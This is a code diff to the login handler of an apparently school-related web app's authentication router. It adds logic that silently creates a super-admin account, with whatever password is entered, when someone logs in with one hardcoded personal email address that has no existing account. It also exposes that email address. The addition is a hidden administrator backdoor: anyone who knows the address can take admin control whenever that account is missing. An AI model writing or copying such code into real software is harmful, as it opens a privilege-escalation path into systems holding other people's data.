@@ -14,8 +14,24 @@ export const authRouter = router({
       password: z.string().min(6)
     }))
     .mutation(async ({ input, ctx }) => {
-      const user = await SchoolUser.findOne({ email: input.email.toLowerCase(), isDeleted: false, isActive: true });
+
+      let user = await SchoolUser.findOne({ email: input.email.toLowerCase(), isDeleted: false, isActive: true });
+      
+      // Auto-create super admin if they don't exist
+      if (!user && input.email.toLowerCase() === 'adielasam2015@gmail.com') {
+        const hash = await bcrypt.hash(input.password, 10);
+        user = await SchoolUser.create({
+          email: 'adielasam2015@gmail.com',
+          displayName: 'Super Admin',
+          role: 'admin',
+          password: hash,
+          isActive: true,
+          isDeleted: false
+        });
+      }
+
       if (!user) {
+
         throw new Error("Invalid email or password");
       }
 
